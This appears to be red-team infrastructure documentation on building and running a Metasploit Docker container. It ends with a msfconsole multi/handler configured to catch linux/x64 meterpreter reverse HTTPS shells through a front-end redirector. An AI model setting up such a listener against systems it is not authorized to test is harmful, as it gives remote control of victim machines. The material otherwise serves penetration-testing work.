# Metasploit container

For Linux and macOS targets. Default Windows signatures are too well-known to be useful against modern endpoint
products, but Metasploit remains a solid choice for opportunistic exploitation and post-exploitation across the
Linux side of an estate.

No maintained public image exists for Metasploit in 2026 (phocean/msf and the Rapid7-published image on Docker
Hub are both unmaintained). Build from a Kali base instead, which keeps the package current via Kali's own
update cadence.

## Dockerfile

```dockerfile
FROM kalilinux/kali-rolling

RUN apt-get update && apt-get install -y --no-install-recommends \
        metasploit-framework && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

EXPOSE 8400-8500

CMD ["msfconsole", "-q"]
```

Build on the backend host:

```bash
docker build -t msf .
```

## Run

```bash
docker run -dit \
    -p 8400-8500:8400-8500 \
    -v ~/.msf4:/root/.msf4 \
    -v /tmp/msf:/tmp/data \
    msf
```

`~/.msf4` persists the database, modules, and workspace data across container restarts. `/tmp/msf` gives a
shared directory for staging files between the host and the container. `-dit` starts the container in the
background with an allocated terminal ready to attach to.

## Attach to the console

```bash
docker attach $(docker ps -qf ancestor=msf)
```

Detach without stopping: `Ctrl-P` then `Ctrl-Q`.

## Start a listener

Inside msfconsole, a reverse HTTPS handler pointing at the [frontend](../frontend/nginx.md):

```
msf6 > use exploit/multi/handler
msf6 exploit(handler) > set PAYLOAD linux/x64/meterpreter/reverse_https
msf6 exploit(handler) > set LHOST <frontend-domain>
msf6 exploit(handler) > set LPORT 443
msf6 exploit(handler) > set ExitOnSession false
msf6 exploit(handler) > run -j
```

`ExitOnSession false` keeps the handler alive after the first session checks in. `-j` runs it as a background
job so the console stays available.
